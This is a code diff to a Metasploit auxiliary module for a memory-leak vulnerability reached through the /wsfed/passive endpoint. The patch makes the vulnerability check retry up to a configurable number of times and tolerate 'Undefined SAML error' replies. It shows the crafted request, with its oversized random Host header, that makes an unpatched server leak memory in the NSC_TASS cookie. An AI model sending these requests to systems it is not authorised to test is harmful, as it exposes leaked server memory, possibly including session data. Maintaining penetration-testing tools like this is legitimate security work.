@@ -42,38 +42,48 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         OptString.new('TARGETURI', [true, 'Base path', '/']),
-        OptInt.new('LEAK_REQUEST_COUNT', [true, 'The number of HTTP requests per host to try and leak data', 4096]),
+        OptInt.new('LEAK_REQUEST_COUNT', [true, 'The number of HTTP requests per host to try and leak data when exploiting the vulnerability', 4096]),
+        OptInt.new('CHECK_REQUEST_COUNT', [true, 'The maximum number of HTTP requests per host to try and leak data when checking for the vulnerability', 4]),
       ]
     )
   end
 
   def check_host(_target_host)
-    res = send_request_cgi(
-      'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, 'wsfed', 'passive'),
-      'headers' => {
-        'Host' => Rex::Text.rand_text_alpha(128)
-      },
-      'vars_get' => {
-        'wctx' => nil
-      }
-    )
-    return Exploit::CheckCode::Unknown('Connection failed') unless res
+    datastore['CHECK_REQUEST_COUNT'].times do
+      res = send_request_cgi(
+        'method' => 'GET',
+        'uri' => normalize_uri(target_uri.path, 'wsfed', 'passive'),
+        'headers' => {
+          'Host' => Rex::Text.rand_text_alpha(128)
+        },
+        'vars_get' => {
+          'wctx' => nil
+        }
+      )
 
-    return Exploit::CheckCode::Unknown("Unexpected response code #{res.code}") unless res.code == 302
+      return Exploit::CheckCode::Unknown('Connection failed') unless res
 
-    cookies = res.get_cookies
+      # If has been observed that some requests generate a 200 response for a SAML error. We can continue
+      # trying to leak data rather than bail out early.
+      next if res.code == 200 && res.body == 'Undefined SAML error'
 
-    # A patched system will not return any cookie values.
-    return Exploit::CheckCode::Safe('Response has no cookies') if cookies.empty?
+      return Exploit::CheckCode::Unknown("Unexpected response code #{res.code}") unless res.code == 302
 
-    return Exploit::CheckCode::Safe('Response has no NSC_TASS cookie') unless cookies.include? 'NSC_TASS='
+      cookies = res.get_cookies
 
-    # We report vulnerable, as by here an unpatched system will be leaking memory in the NSC_TASS cookie, while
-    # a patched system will not return any cookies at all.
-    report_vuln
+      # A patched system will not return any cookie values.
+      return Exploit::CheckCode::Safe('Response has no cookies') if cookies.empty?
 
-    Exploit::CheckCode::Vulnerable('Response contains an NSC_TASS cookie.')
+      return Exploit::CheckCode::Safe('Response has no NSC_TASS cookie') unless cookies.include? 'NSC_TASS='
+
+      # We report vulnerable, as by here an unpatched system will be leaking memory in the NSC_TASS cookie, while
+      # a patched system will not return any cookies at all.
+      report_vuln
+
+      return Exploit::CheckCode::Vulnerable('Response contains an NSC_TASS cookie.')
+    end
+
+    Exploit::CheckCode::Unknown
   end
 
   def run_host(_target_host)
@@ -109,7 +119,7 @@ class MetasploitModule < Msf::Auxiliary
       unless res.code == 302
         vprint_error("#{peer} - Unexpected response code #{res.code}")
 
-        # If has been observed that some request generate a 200 response for a SAML error. We can continue
+        # If has been observed that some requests generate a 200 response for a SAML error. We can continue
         # trying to leak data rather than bail out early.
         next if res.code == 200 && res.body == 'Undefined SAML error'
 
